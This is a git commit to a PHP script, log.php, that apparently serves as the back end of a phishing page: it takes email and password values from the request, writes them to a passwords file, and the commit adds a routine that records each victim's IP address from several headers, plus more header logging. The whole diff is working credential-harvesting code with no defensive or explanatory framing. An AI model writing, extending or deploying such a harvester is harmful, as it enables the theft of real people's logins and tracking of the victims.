bff3247f3ec03fe5482113b6e05fa83048508312
hackman2 <30339823+hackman2@users.noreply.github.com>
2017-07-22 00:15:21 +0200

    passwords.txt now always gets ip

--- log.php
+++ log.php
@@ -10,7 +10,27 @@ $password = $_GET['pass'];
 
 fwrite($credentials_handler, "email='$username'\r\n");
 fwrite($credentials_handler, "pass='$password'\r\n");
-fwrite($credentials_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
+
+function get_client_ip() {
+    $ipaddress = '';
+    if (isset($_SERVER['HTTP_CLIENT_IP']))
+        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_X_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+    else if(isset($_SERVER['HTTP_FORWARDED']))
+        $ipaddress = $_SERVER['HTTP_FORWARDED'];
+    else if(isset($_SERVER['REMOTE_ADDR']))
+        $ipaddress = $_SERVER['REMOTE_ADDR'];
+    else
+        $ipaddress = 'UNKNOWN';
+    return $ipaddress;
+}
+
+fwrite($credentials_handler, get_client_ip() . "\r\n");
 fwrite($credentials_handler, "----------------\r\n");
 
 fclose($credentials_handler);
@@ -27,6 +47,9 @@ fwrite($log_handler, $_SERVER['HTTP_USER_AGENT']);
 fwrite($log_handler, "\r\n");
 fwrite($log_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
 fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n");
+fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED'] . "\r\n");
+fwrite($log_handler, $_SERVER['HTTP_FORWARDED_FOR'] . "\r\n");
+fwrite($log_handler, $_SERVER['HTTP_FORWARDED'] . "\r\n");
 fwrite($log_handler, $_SERVER['REMOTE_ADDR'] . "\r\n");
 fwrite($log_handler, "----------------\r\n");
 
